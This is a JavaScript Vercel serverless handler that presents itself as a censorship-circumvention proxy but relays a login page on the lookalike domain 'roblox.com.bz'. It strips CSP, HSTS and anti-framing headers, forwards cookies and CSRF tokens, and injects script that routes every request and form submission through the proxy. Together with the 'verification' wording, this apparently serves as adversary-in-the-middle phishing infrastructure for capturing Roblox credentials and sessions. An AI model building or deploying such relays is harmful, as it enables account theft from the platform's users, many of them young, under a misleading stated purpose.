/**
 * Serverless Reverse Proxy — Live Relay via corsproxy.org
 *
 * Fetches roblox.com.bz content server-side through corsproxy.org
 * and relays it to the client. Users in countries that block
 * roblox.com.bz can access the page through this Vercel proxy.
 *
 * HTML responses get a fetch/XHR interceptor injected so
 * all subsequent requests from the page also route through this proxy.
 */

const DEFAULT_TARGET_URL =
  process.env.TARGET_URL ||
  process.env.VERIFICATION_URL ||
  "https://roblox.com.bz/login?returnUrl=4191421542448922";

const TARGET_ORIGIN = "https://roblox.com.bz";

const FORBIDDEN_RESPONSE_HEADERS = new Set([
  "x-frame-options",
  "content-security-policy",
  "content-security-policy-report-only",
  "frame-ancestors",
  "strict-transport-security",
  "cross-origin-opener-policy",
  "cross-origin-embedder-policy",
  "cross-origin-resource-policy",
  "content-encoding",
  "content-length",
  "transfer-encoding",
  "connection",
  "keep-alive",
  "te",
  "trailer",
  "upgrade",
  "proxy-authorization",
  "proxy-authenticate",
]);

const BROWSER_UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

/**
 * Fetch via corsproxy.org relay
 */
async function relayFetch(targetUrl, method, headers, body) {
  const proxyUrl = `https://corsproxy.org/?${encodeURIComponent(targetUrl)}`;

  const fetchHeaders = {
    "User-Agent": BROWSER_UA,
    Accept: headers.accept || "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": headers["accept-language"] || "en-US,en;q=0.9",
  };

  if (headers.cookie) fetchHeaders["Cookie"] = headers.cookie;
  if (headers["content-type"]) fetchHeaders["Content-Type"] = headers["content-type"];
  if (headers["x-csrf-token"]) fetchHeaders["X-CSRF-Token"] = headers["x-csrf-token"];

  const fetchOptions = {
    method,
    headers: fetchHeaders,
    redirect: "follow",
  };

  if ((method === "POST" || method === "PUT") && body) {
    fetchOptions.body = typeof body === "string" ? body : JSON.stringify(body);
  }

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 9000);

  const response = await fetch(proxyUrl, {
    ...fetchOptions,
    signal: controller.signal,
  });
  clearTimeout(timeoutId);

  return response;
}

/**
 * Injeta interceptor de fetch/XHR no HTML para rotear
 * todas as sub-requisições pelo proxy
 */
function injectInterceptor(html) {
  // Remove CSP
  html = html.replace(
    /<meta[^>]+http-equiv=["']?Content-Security-Policy["']?[^>]*>/gi,
    ""
  );

  const interceptor = `
<script>
(function() {
  var PROXY = "/api/proxy?url=";
  var TARGET = "${TARGET_ORIGIN}";

  var _fetch = window.fetch;
  window.fetch = function(url, opts) {
    if (typeof url === "string") {
      if (url.startsWith("/") && !url.startsWith("/api/")) {
        url = PROXY + encodeURIComponent(TARGET + url);
      } else if (url.indexOf("roblox.com.bz") !== -1) {
        url = PROXY + encodeURIComponent(url);
      }
    } else if (url && url.url) {
      var reqUrl = url.url;
      if (reqUrl.indexOf("roblox.com.bz") !== -1) {
        url = new Request(PROXY + encodeURIComponent(reqUrl), url);
      }
    }
    return _fetch.call(this, url, opts);
  };

  var _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === "string") {
      if (url.startsWith("/") && !url.startsWith("/api/")) {
        url = PROXY + encodeURIComponent(TARGET + url);
      } else if (url.indexOf("roblox.com.bz") !== -1) {
        url = PROXY + encodeURIComponent(url);
      }
    }
    return _open.apply(this, [method, url].concat(Array.prototype.slice.call(arguments, 2)));
  };

  document.addEventListener("DOMContentLoaded", function() {
    document.querySelectorAll("a[href]").forEach(function(el) {
      var h = el.getAttribute("href");
      if (h && h.startsWith("/") && !h.startsWith("/api/")) {
        el.setAttribute("href", TARGET + h);
      }
    });
    document.querySelectorAll("form[action]").forEach(function(el) {
      var a = el.getAttribute("action");
      if (a && a.startsWith("/")) {
        el.setAttribute("action", PROXY + encodeURIComponent(TARGET + a));
      }
    });
  });
})();
</script>
`;

  // Injeta no <head>
  if (/<head[^>]*>/i.test(html)) {
    html = html.replace(/<head([^>]*)>/i, `<head$1>${interceptor}`);
  } else {
    html = interceptor + html;
  }

  return html;
}

export default async function handler(req, res) {
  // CORS
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS,PUT,DELETE");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, Cookie, Authorization"
  );
  res.setHeader("X-Frame-Options", "ALLOWALL");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  // Determina URL alvo
  const targetUrl = req.query.url
    ? decodeURIComponent(req.query.url)
    : DEFAULT_TARGET_URL;

  try {
    const response = await relayFetch(
      targetUrl,
      req.method,
      req.headers,
      req.body
    );

    const contentType = response.headers.get("content-type") || "application/octet-stream";

    // Copia headers seguros
    response.headers.forEach((val, key) => {
      if (!FORBIDDEN_RESPONSE_HEADERS.has(key.toLowerCase())) {
        try { res.setHeader(key, val); } catch (e) {}
      }
    });

    res.setHeader("X-Frame-Options", "ALLOWALL");
    res.setHeader("Access-Control-Allow-Origin", "*");

    // HTML: injeta interceptor
    if (contentType.includes("text/html")) {
      let html = await response.text();
      html = injectInterceptor(html);
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      return res.status(response.status).send(html);
    }

    // JSON / texto
    if (contentType.includes("application/json") || contentType.includes("text/")) {
      const text = await response.text();
      res.setHeader("Content-Type", contentType);
      return res.status(response.status).send(text);
    }

    // Binário
    const arrayBuffer = await response.arrayBuffer();
    res.setHeader("Content-Type", contentType);
    return res.status(response.status).send(Buffer.from(arrayBuffer));
  } catch (error) {
    console.error("❌ Proxy relay error:", error);
    return res.status(500).send(`
      <!DOCTYPE html>
      <html lang="pt-BR">
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>Proxy Connection</title>
          <style>
            body { background:#0d0f14;color:#cbd5e1;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;padding:20px;box-sizing:border-box; }
            .box { text-align:center;padding:30px;background:#14161f;border:1px solid rgba(255,255,255,0.08);border-radius:12px;max-width:420px;box-shadow:0 10px 25px rgba(0,0,0,0.5); }
            h2 { color:#f87171;font-size:20px;margin:0 0 12px; }
            p { font-size:14px;line-height:1.5;color:#94a3b8;margin:0 0 20px; }
            .btn-retry { display:inline-block;background:#00a2ff;color:#fff;padding:10px 24px;border-radius:6px;font-weight:600;font-size:14px;border:none;cursor:pointer; }
            .countdown { font-size:12px;color:#64748b;margin-top:14px; }
          </style>
        </head>
        <body>
          <div class="box">
            <h2>Connection Proxy Error</h2>
            <p>Não foi possível conectar ao servidor de verificação. Tentando reconectar automaticamente...</p>
            <button class="btn-retry" onclick="location.reload()">Tentar Novamente</button>
            <div class="countdown" id="timer">Reconectando em 5 segundos...</div>
          </div>
          <script>
            let count=5;const t=document.getElementById("timer");const i=setInterval(()=>{count--;if(count>0){t.textContent="Reconectando em "+count+" segundos...";}else{clearInterval(i);location.reload();}},1000);
          </script>
        </body>
      </html>
    `);
  }
}
